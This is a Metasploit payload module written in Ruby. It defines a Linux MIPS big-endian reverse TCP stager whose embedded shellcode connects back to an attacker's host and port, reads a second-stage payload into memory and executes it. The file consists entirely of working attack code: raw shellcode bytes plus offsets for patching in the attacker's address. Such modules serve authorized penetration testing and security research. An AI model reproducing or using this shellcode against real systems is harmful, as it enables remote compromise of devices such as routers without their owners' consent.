##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        =>
        [
          'juan vazquez'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSBE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ [58, 62], 'ADDR16MSB' ],
              'LPORT' => [ 50, 'n'    ],
            },
          'Payload' =>
            "\x24\x0f\xff\xfa\x01\xe0\x78\x27\x21\xe4\xff\xfd\x21\xe5" +
            "\xff\xfd\x28\x06\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c" +
            "\xaf\xa2\xff\xfc\x8f\xa4\xff\xfc\x24\x0f\xff\xfd\x01\xe0" +
            "\x78\x27\xaf\xaf\xff\xe0\x3c\x0e\x11\x5c\xaf\xae\xff\xe4" +
            "\x3c\x0e\x7f\x00\x35\xce\x00\x01\xaf\xae\xff\xe6\x27\xa5" +
            "\xff\xe2\x24\x0c\xff\xef\x01\x80\x30\x27\x24\x02\x10\x4a" +
            "\x01\x01\x01\x0c\x24\x04\xff\xff\x24\x05\x10\x01\x20\xa5" +
            "\xff\xff\x24\x09\xff\xf8\x01\x20\x48\x27\x01\x20\x30\x20" +
            "\x24\x07\x08\x02\x24\x0b\xff\xea\x01\x60\x58\x27\x03\xab" +
            "\x58\x20\xad\x60\xff\xff\xad\x62\xff\xfb\x24\x02\x0f\xfa" +
            "\x01\x01\x01\x0c\xaf\xa2\xff\xf8\x8f\xa4\xff\xfc\x8f\xa5" +
            "\xff\xf8\x24\x06\x10\x01\x20\xc6\xff\xff\x24\x02\x0f\xa3" +
            "\x01\x01\x01\x0c\x8f\xb1\xff\xf8\x8f\xb2\xff\xfc\x02\x20" +
            "\xf8\x09"
        }
      ))
  end

end
